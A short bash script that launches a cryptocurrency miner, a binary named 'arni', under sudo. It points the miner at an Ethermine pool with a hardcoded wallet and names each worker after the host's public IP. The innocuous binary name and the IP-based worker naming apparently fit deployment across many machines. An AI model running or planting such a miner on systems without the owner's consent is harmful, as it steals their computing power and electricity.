#!/bin/bash

POOL=ssl://us1.ethermine.org:5555
WALLET=0xA8C60B08AF30FEb282020D5b1704e5f3302EE7ea.$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./arni && sudo ./arni -pool $POOL -wal $WALLET $@ -pass x -proto 3 -stales 0
